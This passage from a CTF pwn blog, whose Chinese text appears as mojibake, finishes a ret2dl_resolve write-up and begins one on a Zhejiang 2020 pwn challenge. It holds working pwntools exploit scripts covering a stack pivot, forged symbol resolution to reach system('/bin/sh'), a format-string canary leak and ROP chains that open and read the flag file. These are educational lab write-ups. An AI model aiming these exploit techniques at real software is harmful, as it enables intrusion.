class="code"><pre><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line">rel_plt=<span class="number">0x8048388</span></span><br><span class="line">dynsym=<span class="number">0x8048248</span></span><br><span class="line">str_tab=<span class="number">0x80482D8</span></span><br><span class="line">cmd=<span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">align=<span class="number">0x10</span>-(stack_start+<span class="number">28</span>-dynsym)%<span class="number">0x10</span></span><br><span class="line">fake_sym_addr=stack_start+<span class="number">28</span>+align</span><br><span class="line">r_info=(((fake_sym_addr-dynsym)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line">fake_puts=flat(p32(puts_got),p32(r_info))</span><br><span class="line"></span><br><span class="line">reloc_arg=stack_start+<span class="number">20</span>-rel_plt</span><br><span class="line">fake_sym=flat(p32(<span class="number">0x1a</span>),p32(<span class="number">0</span>)*<span class="number">2</span>,p32(<span class="number">0x12</span>))</span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment">#è¿™ä¸ªç»™leaveæŒ‡ä»¤åçš„pop ebpï¼Œå®é™…ä»ä¸‹é¢å¼€å§‹æ‰§è¡Œ</span></span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line">,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">,p32(stack_start+<span class="number">92</span>)</span><br><span class="line">,fake_puts</span><br><span class="line">,align*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">,fake_sym</span><br><span class="line">)</span><br><span class="line">payload=payload.ljust(<span class="number">92</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=cmd </span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h2 id="ä¼ªé€ å­—ç¬¦ä¸²"><a href="#ä¼ªé€ å­—ç¬¦ä¸²" class="headerlink" title="ä¼ªé€ å­—ç¬¦ä¸²"></a>ä¼ªé€ å­—ç¬¦ä¸²</h2><p>æœ€åä¸€æ­¥å°±æ˜¯åœ¨æŸä¸ªåœ°æ–¹å†™ä¸Š<code>puts</code>ç„¶åä¿®æ”¹<code>st_name</code>åˆ°é‚£ä¸ª<code>puts</code>å°±å¯ï¼Œç„¶åæŠŠ<code>puts</code>æ›¿æ¢æˆ<code>system</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">proc=&#x27;./bof&#x27;</span><br><span class="line">elf=ELF(proc)</span><br><span class="line">p=process(proc)</span><br><span class="line">elf=ELF(proc)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">read=elf.plt[&#x27;read&#x27;]</span><br><span class="line">bss=0x804c024#readelf -S bofæŸ¥çœ‹æ‰€æœ‰çš„æ®µçš„åœ°å€</span><br><span class="line">ppp_ret=0x08049331#ROPgadget</span><br><span class="line">leave_ret=0x08049145</span><br><span class="line">pop_ebp=0x08049333</span><br><span class="line">stack_size=0x800</span><br><span class="line">stack_start=bss+stack_size</span><br><span class="line">buf_size=0x6c+4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> buf_size*b&#x27;a&#x27;</span><br><span class="line">,p32(read)+p32(ppp_ret)#å¼¹å‡ºä¸‰ä¸ªå‚æ•°</span><br><span class="line">,p32(0)+p32(stack_start)</span><br><span class="line">,p32(100)</span><br><span class="line">,p32(pop_ebp)#æ ˆè¿ç§»</span><br><span class="line">,p32(stack_start)</span><br><span class="line">,p32(leave_ret)</span><br><span class="line">)</span><br><span class="line">p.sendlineafter(b&#x27;Welcome to the last stackoverflow&#x27;,payload)</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">plt_0=0x8049030</span><br><span class="line">rel_plt=0x8048388</span><br><span class="line">dynsym=0x8048248</span><br><span class="line">str_tab=0x80482D8</span><br><span class="line">cmd=b&#x27;/bin/sh\0&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">align=0x10-(stack_start+28-dynsym)%0x10</span><br><span class="line">fake_sym_addr=stack_start+28+align</span><br><span class="line">r_info=(((fake_sym_addr-dynsym)//16)&lt;&lt;8)|0x7</span><br><span class="line">fake_puts=flat(p32(puts_got),p32(r_info))</span><br><span class="line"></span><br><span class="line">str_addr=fake_sym_addr+0x10</span><br><span class="line">st_name=str_addr-str_tab</span><br><span class="line"></span><br><span class="line">reloc_arg=stack_start+20-rel_plt</span><br><span class="line">fake_sym=flat(p32(st_name),p32(0)*2,p32(0x12))</span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> b&#x27;a&#x27;*4#è¿™ä¸ªç»™leaveæŒ‡ä»¤åçš„pop ebpï¼Œå®é™…ä»ä¸‹é¢å¼€å§‹æ‰§è¡Œ</span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line"></span><br><span class="line">,p32(stack_start+92)*2</span><br><span class="line">,fake_puts</span><br><span class="line">,align*b&#x27;a&#x27;</span><br><span class="line">,fake_sym</span><br><span class="line">,b&#x27;system\0&#x27;</span><br><span class="line">)</span><br><span class="line">print(st_name)</span><br><span class="line">payload=payload.ljust(92,b&#x27;a&#x27;)</span><br><span class="line">payload+=cmd </span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/19/NBuOMalU5tvi9JL.png" alt="ret2dl_resolve_3.png"></p><p>å®Œç»“æ’’èŠ±ï¼Œå¼€å§‹å­¦å †ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æµ™æ±Ÿ2020çœèµ›pwn1</title>
      <link href="/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/"/>
      <url>/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/</url>
      
        <content type="html"><![CDATA[<p>æ®å­¦é•¿è¯´ï¼Œé‚£ä¸€æ¬¡çš„ctfå‡ºé¢˜äººä¸€å¥â€œæˆ‘å°±æ²¡æ‰“ç®—è®©pwnæœ‰è§£â€è®©å…¨åœºæ‰€æœ‰pwnerç›´å‘¼å†…è¡Œï¼Œpwn1çœ‹ä¼¼ç®€å•å®åˆ™åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­èƒ½å‡ºæ¯”èµ›ä¹Ÿå¿«ç»“æŸäº†ã€‚</p><span id="more"></span><h2 id="åˆ†æelfç¡®å®šå¤§æ¦‚æ€è·¯"><a href="#åˆ†æelfç¡®å®šå¤§æ¦‚æ€è·¯" class="headerlink" title="åˆ†æelfç¡®å®šå¤§æ¦‚æ€è·¯"></a>åˆ†æelfç¡®å®šå¤§æ¦‚æ€è·¯</h2><p>IDAæ‰“å¼€åˆ†æelfæ–‡ä»¶</p><p><code>main()</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  __int16 *v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+12h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+13h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  __int16 v10; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+1Ah] [rbp-26h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+1Bh] [rbp-25h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  __int16 v14; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+22h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+23h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int16 v18; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+2Ah] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+2Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v22; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v22 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="number">32</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">21</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">1</span>;</span><br><span class="line">  v13 = <span class="number">59</span>;</span><br><span class="line">  v14 = <span class="number">6</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v18 = <span class="number">6</span>;</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">2147418112</span>;</span><br><span class="line">  v4 = <span class="number">4</span>;</span><br><span class="line">  v5 = &amp;v6;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v4);</span><br><span class="line">  welcome(<span class="number">22LL</span>, <span class="number">2LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ«çš„å¯èƒ½ä¼šæœ‰äº›è®¸å·®å¼‚ï¼Œä½†æ˜¯å®ƒè°ƒç”¨äº†<code>prctl</code>å‡½æ•°æˆ‘ä»¬å°±è¦æœ‰æ‰€è­¦æƒ•äº†ï¼Œå°±è¦æƒ³å®ƒåº”è¯¥å¼€äº†æ²™ç®±ä¿æŠ¤ã€‚ç”¨<code>seccomp-tools</code>æŸ¥<code>elf</code>çš„æ²™ç®±ä¿æŠ¤ï¼Œå‘ç°è¯¥elfç¦ç”¨äº†<code>execve</code>ç³»ç»Ÿè°ƒç”¨ã€‚</p><p><img src="https://i.loli.net/2021/07/15/FrlJvebK4ugTW63.png" alt="zjctf pwn1_1.png"></p><p>è¿™ä¸ªä¿æŠ¤çš„å¼€å¯å°±ç›¸å½“äºæ–­ç»äº†æˆ‘ä»¬è°ƒç”¨<code>system</code>çš„ç»å¤§éƒ¨åˆ†çš„å‘½ä»¤ï¼Œè¯¸å¦‚<code>/bin/sh</code>æˆ–è€…æ˜¯<code>cat flag</code>è¿™ç±»çš„ã€‚å¯¹äºè¿™ä¸ªæˆ‘ä»¬ä¹Ÿæ˜¯æœ‰åº”å¯¹æªæ–½çš„ï¼Œé‚£å°±æ˜¯<code>orw</code>(<code>open</code>-<code>read</code>-<code>write</code>çš„ç¼©å†™)ã€‚è¿™ä¸€é¢˜å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬ç”¨è¿™ä¸ªæ–¹æ³•å»è·å–<code>flag</code>äº†ã€‚</p><h2 id="å¯»æ‰¾æ¼æ´ç‚¹"><a href="#å¯»æ‰¾æ¼æ´ç‚¹" class="headerlink" title="å¯»æ‰¾æ¼æ´ç‚¹"></a>å¯»æ‰¾æ¼æ´ç‚¹</h2><p>ç¡®å®šå¥½æ€è·¯ä¹‹åè¿›<code>welcome()</code>å‡½æ•°å¯»æ‰¾æ¼æ´ç‚¹ã€‚</p><p><img src="https://i.loli.net/2021/07/15/p7gRyNJAQ18sIZm.png" alt="zjctf pwn1_2.png"></p><p>å¾ˆæ˜æ˜¾å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å’Œæ ˆæº¢å‡ºæ¼æ´ï¼Œè€Œpltè¡¨æ®µå­˜åœ¨<code>_stack_chk_fail</code>å‡½æ•°ï¼Œé‚£å°±æ˜¯å¼€äº†<code>canary</code>ä¿æŠ¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‚¯å®šæ˜¯å…ˆåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„è¯»çš„ç‰¹æ€§æ³„éœ²<code>canary</code>ï¼Œå†æ ˆæº¢å‡ºã€‚</p><h3 id="canaryåç§»ç¡®å®š"><a href="#canaryåç§»ç¡®å®š" class="headerlink" title="canaryåç§»ç¡®å®š"></a>canaryåç§»ç¡®å®š</h3><p>é¦–å…ˆæ˜¯çœ‹å­—ç¬¦ä¸²ç›¸å¯¹äºæ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå‚æ•°çš„åç§»ã€‚å› ä¸º<code>buf</code>åˆšå¥½åœ¨<code>welcome</code>å‡½æ•°çš„ç¼“å†²åŒºé¡¶éƒ¨ï¼Œå› æ­¤å¾ˆå®¹æ˜“å¯ä»¥çŒœæµ‹<code>buf</code>è·ç¦»ç¬¬ä¸€ä¸ªå‚æ•°å·®äº†6*8ä¸ªå­—èŠ‚ï¼Œå› ä¸ºå®ƒä»¬ä¸­é—´éš”äº†5ä¸ªå¯„å­˜å™¨ã€‚ç„¶å<code>buf</code>åˆ°æ ˆåº•åˆæœ‰<code>0xb0</code>ä¸ªå­—èŠ‚ï¼Œè€Œcanaryå°±åœ¨rsp-8çš„ä½ç½®ä¸Šã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œcanaryåº”è¯¥åœ¨printfé™¤äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°ä»¥å¤–çš„ç¬¬<code>(6x8+0xb0-8)/8=27</code>ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡çš„<code>payload</code>æˆ‘ä»¬å°±ç»™<code>%27$p</code>ï¼Œçœ‹çœ‹è¾“å‡ºçš„æ˜¯ä¸æ˜¯<code>canary</code>æœ‰å¦‚ä¸‹ç‰¹æ€§ï¼š</p><p>â‘ éšæœºæ€§ï¼Œæ¯æ¬¡è¿è¡Œå·®åˆ«éƒ½ä¼šå¾ˆå¤§</p><p>â‘¡æœ€ä½ä½å­—èŠ‚æ°¸è¿œä¸º\0</p><p><img src="https://i.loli.net/2021/07/15/SCzM9NT2cauwPOo.png" alt="zjctf pwn1_3.png.png"></p><p>å¤šæ¬¡æµ‹è¯•å‘ç°å‡ç¬¦åˆä¸Šé¢ä¸¤ä¸ªç‰¹æ€§ï¼Œå› æ­¤canaryå°±è¢«æ³„éœ²å‡ºæ¥äº†ã€‚</p><p>æˆ‘ä»¬æ¥æ”¶çš„æ˜¯æ•°å­—ç»„æˆçš„å­—èŠ‚ï¼Œå› æ­¤æˆ‘ä»¬ä¼šæ¥æ”¶åˆ°16ä¸ª16è¿›åˆ¶çš„æ•°ï¼Œç„¶åå­—èŠ‚è½¬æˆæ•°å€¼åç”¨p64è½¬ä¸ºå­—èŠ‚å°±å¯ä»¥åˆ©ç”¨<code>canary</code>äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%27$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Welcome! What is your name?&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯ç¬¬ä¸€æ­¥çš„<code>payload</code></p><h2 id="æ ˆæº¢å‡ºæ³„éœ²libc"><a href="#æ ˆæº¢å‡ºæ³„éœ²libc" class="headerlink" title="æ ˆæº¢å‡ºæ³„éœ²libc"></a>æ ˆæº¢å‡ºæ³„éœ²libc</h2><p>é¢˜ç›®ä¸­å­˜åœ¨è¾“å‡ºå‡½æ•°<code>puts</code>ã€‚</p><p>è¿™ä¸ªç”¨ä¸€èˆ¬çš„payloadå°±å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(buf_size-<span class="number">8</span>)+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+P64(pop_rdi)+p64(puts_got)+p64(puts)+p64(welcome)</span><br></pre></td></tr></table></figure><p>æ³„éœ²å®Œæˆä¹‹åè®°å¾—é‡æ–°æ‰§è¡Œ<code>welcome</code>å®ç°äºŒæ¬¡æº¢å‡ºæ‰§è¡Œä¸€äº›libcçš„å‡½æ•°ï¼Œå› ä¸ºæˆ‘ä»¬ä¸éœ€è¦<code>system</code>ï¼Œåªéœ€è¦<code>orw</code>ï¼Œåœ¨å·²æœ‰çš„å‡½æ•°ä¸­å°±ç¼ºä¸€ä¸ª<code>open</code>å‡½æ•°ã€‚æ‰¾åˆ°åç§»å¾—åˆ°opençš„çœŸå®åœ°å€ã€‚å› ä¸ºæˆ‘åªèƒ½æœ¬åœ°å¤ç›˜ï¼Œåˆæ²¡æœ‰åŠ è½½å®ƒç»™çš„libcï¼Œå› æ­¤åç§»åªèƒ½æ˜¯æˆ‘è‡ªå·±æœ¬åœ°è°ƒè¯•æ˜¯å¤šå°‘å°±æ˜¯å¤šå°‘äº†ã€‚</p><h2 id="openå‡½æ•°çš„è°ƒç”¨"><a href="#openå‡½æ•°çš„è°ƒç”¨" class="headerlink" title="openå‡½æ•°çš„è°ƒç”¨"></a>openå‡½æ•°çš„è°ƒç”¨</h2><p>openå‡½æ•°åªéœ€è¦ä¸¤ä¸ªå°±èƒ½å®Œæˆï¼Œä¸€ä¸ªæ˜¯<code>&quot;flag&quot;</code>æˆ–è€…æ˜¯<code>&quot;flag.txt&quot;</code>ï¼Œå¦ä¸€ä¸ªå‚æ•°å°±æ˜¯<code>&quot;r&quot;</code>æˆ–è€…æ˜¯0ã€‚è€Œåªæœ‰æ ˆæ˜¯æˆ‘ä»¬å¯è¯»å¯å†™å¯ä»¥éšæ„æ§åˆ¶çš„ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦æ³„éœ²æ ˆåœ°å€ã€‚æ³„éœ²æ ˆåœ°å€ä¸æ³„éœ²canaryæ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œå¯ä»¥ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä»»æ„å†™å’ŒCå­—ç¬¦ä¸²çš„åˆ¤å®šæ–¹å¼æ¥æ³„éœ²å­˜å‚¨åœ¨æ ˆä¸­çš„<code>rbp</code>ï¼Œè¿™é‡Œå·²ç»æœ‰äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨<code>payload1</code>åŠ ä¸Šä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦æ¥å¤šæ³„éœ²ä¸€ä¸ª<code>rbp</code>ã€‚</p><p><code>gdb</code>æ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œç”¨å®ƒæ¥è°ƒè¯•ä¸€ä¸‹ã€‚å› ä¸ºæˆ‘ä»¬çš„<code>rop</code>é“¾æ˜¯æ‰§è¡Œåˆ°<code>welcome</code>çš„é‚£ä¸ªåœ°æ–¹æ‰æ˜¯æ ˆåº•ï¼Œæ‰€ä»¥æˆ‘ä»¬æ³„éœ²é‚£è¾¹çš„<code>rsp</code></p><p><img src="https://i.loli.net/2021/07/16/pjHAqX3LF6T5iM7.png" alt="zjctf pwn1_4.png"></p><p>é‚£è¾¹çš„<code>rbp</code>åˆšå¥½æ˜¯æˆ‘ä»¬æ–°çš„<code>welcome</code>å‡½æ•°çš„æ ˆåº•ï¼Œè®²çš„é€šä¿—ç‚¹ä¸Šé¢å°±æ˜¯<code>canary</code>äº†ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬çš„payloadå’Œå¯¹åº”çš„æ¥å—è¾“å‡ºçš„æªæ–½å°±å¯ä»¥æ”¹æˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%27$p %31$p&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥åœ¨ä¸‹ä¸€æ¬¡çš„<code>payload</code>é‡Œé¢è¾“å…¥<code>flag</code>å­—ç¬¦ä¸²å¹¶ä¸”æ ¹æ®åœ°å€å»å¼•ç”¨å®ƒã€‚é¦–å…ˆè¿˜æ˜¯è€æ ·å­æŠŠ<code>canary</code>æ³„éœ²å‡ºæ¥ï¼Œç„¶å<code>open</code>å‡½æ•°å»æ‰“å¼€<code>flag</code>æ–‡ä»¶ã€‚è¿™é‡Œæˆ‘çš„åšæ³•æ˜¯æŠŠ<code>flag</code>è¾“å‡ºåˆ°äº†åé¢ï¼Œä½†å…¶å®å¯ä»¥åœ¨å‰é¢å°±æŠŠ<code>flag</code>å­—ç¬¦ä¸²æ”¾ä¸Šå»ï¼Œé‚£æ ·åç§»è¿˜æ˜¯å›ºå®šçš„ï¼Œè€Œæ”¾åœ¨åé¢çš„è¯è¿˜å¾—æ ¹æ®<code>rop</code>é“¾çš„é•¿åº¦åˆ¤æ–­åœ°å€ã€‚ä½†æ˜¯æ€è·¯æ˜¯è¿™ä¹ˆä¸ªæ€è·¯ï¼Œå¯ä»¥æƒ³ä¸€ä¸‹ä¸‡ä¸€ç¼“å†²åŒºæ²¡ç»™å¤Ÿï¼Œè¿˜å¾—è¾“å‡ºåœ¨åé¢çš„æ—¶å€™è¯¥ç”¨ä»€ä¹ˆæªæ–½åº”å¯¹ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆå¥½ç”¨çš„ä¸œè¥¿å°±æ˜¯<code>ljust</code>å›ºå®š<code>rop</code>é“¾å¤§å°ç„¶åå†å»å†™ã€‚</p><p>è¿™é‡Œæˆ‘ç»™äº†<code>0xb0</code>çš„é•¿åº¦å»å†™ropé“¾ï¼Œå…ˆä¸€æ­¥æ­¥æ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">    ).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸€éƒ¨åˆ†è¾“å…¥ä¹‹å<code>gdb</code>è°ƒè¯•çœ‹çœ‹èƒ½ä¸èƒ½æˆåŠŸæ‰“å¼€<code>flag</code>æ–‡ä»¶ã€‚</p><p><img src="https://i.loli.net/2021/07/16/3cn94oHrGYumJR5.png" alt="zjctf pwn1_5.png"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸæŠŠ<code>rdi</code>çš„å€¼å˜æˆäº†<code>flag</code>å­—ç¬¦ä¸²äº†ï¼Œåé¢ä¸€æ­¥ä¹Ÿæ˜¯ç›´æ¥æ‰§è¡Œäº†<code>open</code>å‡½æ•°ã€‚æ¥ç€è°ƒè¯•å‘ç°<code>open</code>è¿”å›å€¼ä¸º3ï¼Œè¯´æ˜è¯¥æ–‡ä»¶æè¿°ç¬¦ä¸º3ï¼Œç­‰ä¸€ä¸‹<code>read</code>é‡Œé¢çš„<code>fd</code>å‚æ•°å°±åº”è¯¥ç»™3äº†ã€‚å› ä¸ºè¿™é‡Œæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå‰ä¸¤ä¸ªå¯„å­˜å™¨çš„gadgetå¾ˆå®¹æ˜“æ‰¾å¾—åˆ°ï¼Œç¬¬ä¸‰ä¸ªrdxç›¸å…³çš„gadgetæ˜¯æ­»æ´»æ‰¾ä¸åˆ°ã€‚è¿™æ ·çš„è¯æœ‰ä¸‰ç§åº”å¯¹æªæ–½</p><p>â‘ 